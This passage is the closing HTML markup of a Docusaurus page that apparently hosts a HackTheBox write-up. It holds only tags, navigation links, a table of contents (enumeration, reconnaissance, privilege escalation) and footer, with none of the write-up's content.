0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/windows/">windows</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/smb/">smb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/azure/">azure</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Mango/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Mango </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Nest/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Nest </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#-info" class="table-of-contents__link toc-highlight">ðŸ’¢ Info</a><ul><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#network-reconnaissance" class="table-of-contents__link toc-highlight">Network reconnaissance</a></li><li><a href="#privilege-escalation--mhope-to-administrator" class="table-of-contents__link toc-highlight">Privilege Escalation : mhope to Administrator</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   â™¥  by CyFun Â© 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>